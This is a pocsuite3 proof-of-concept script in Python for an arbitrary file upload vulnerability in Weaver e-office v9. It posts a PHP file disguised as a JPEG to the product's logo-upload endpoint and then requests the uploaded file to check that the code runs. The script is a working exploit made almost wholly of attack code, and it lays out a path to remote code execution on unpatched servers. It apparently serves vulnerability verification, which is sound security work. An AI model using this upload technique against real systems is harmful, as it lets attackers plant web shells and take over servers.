"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit http://pocsuite.org
"""

from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, logger, VUL_TYPE
from pocsuite3.lib.utils import random_str


class DemoPOC(POCBase):
    vulID = '0'  # ssvid
    version = '1.0'
    author = ['sn1per']
    vulDate = '2021-11-28'
    createDate = '2021-11-28'
    updateDate = '2021-11-28'
    references = ['']
    name = '泛微e-office v9 任意文件上传'
    appPowerLink = ''
    appName = '泛微-EOffice'
    appVersion = ''
    vulType = "任意文件上传"
    desc = '''
    '''
    samples = []
    install_requires = ['']


    def _verify(self):
        result = {}
        headers={
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) ",
        "Accept-Encoding": "gzip, deflate",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",

        }
        url = self.url.rstrip(
            '/') + "/general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId="

        payload = {'Filedata':('test.php','<?php phpinfo();?>','image/jpeg')}

        resp = requests.post(url, files=payload)
        try:
            if "logo-eoffice.php" in resp.text:
                url2 = self.url.rstrip('/')+"/images/logo/logo-eoffice.php"
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url2
                result['VerifyInfo']['Postdata'] = payload
                return self.parse_output(result)
            if resp.status_code == 200:
                url2 = self.url.rstrip('/')+"/images/logo/logo-eoffice.php"
                resp2 = requests.get(url2)
                if "PHP Version" in resp2.text:
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = url2
                    result['VerifyInfo']['Postdata'] = payload
        except Exception as ex:
            logger.error(str(ex))

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    _attack = _verify


register_poc(DemoPOC)

